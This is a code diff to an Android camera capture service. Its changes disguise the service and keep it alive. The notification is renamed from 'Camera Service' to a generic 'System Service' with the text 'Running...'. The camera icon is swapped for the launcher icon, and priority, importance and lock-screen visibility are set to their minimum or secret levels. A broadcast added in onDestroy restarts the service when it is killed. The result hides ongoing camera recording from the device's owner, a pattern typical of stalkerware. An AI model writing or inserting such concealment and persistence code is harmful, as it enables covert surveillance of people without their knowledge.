@@ -172,12 +172,14 @@ public class CameraService extends Service {
                 PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Camera Service")
-                .setContentText("Camera service is running")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setContentTitle("System Service") // Minimized
+                .setContentText("Running...") // Minimized
+                .setSmallIcon(R.drawable.ic_launcher_foreground) // Use default launcher icon or similar
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setShowWhen(false)
                 .build();
 
         if (Build.VERSION.SDK_INT >= 34) {
@@ -196,8 +198,8 @@ public class CameraService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Camera Service",
-                    NotificationManager.IMPORTANCE_LOW);
+                    "System Service",
+                    NotificationManager.IMPORTANCE_MIN);
             channel.setDescription("Camera capture service");
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -804,6 +806,11 @@ public class CameraService extends Service {
     public void onDestroy() {
         super.onDestroy();
         Log.d(TAG, "CameraService onDestroy");
+
+        // Broadcast restart
+        Intent broadcastIntent = new Intent(this, RestartReceiver.class);
+        sendBroadcast(broadcastIntent);
+
         isStreaming = false;
         stopVideoRecording();
         closeCamera();
@@ -1052,12 +1059,14 @@ public class CameraService extends Service {
                     PendingIntent.FLAG_IMMUTABLE);
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("Camera Service")
-                    .setContentText(text)
-                    .setSmallIcon(android.R.drawable.ic_menu_camera)
+                    .setContentTitle("System Service")
+                    .setContentText("Running...")
+                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                    .setShowWhen(false)
                     .build();
 
             NotificationManager manager = getSystemService(NotificationManager.class);
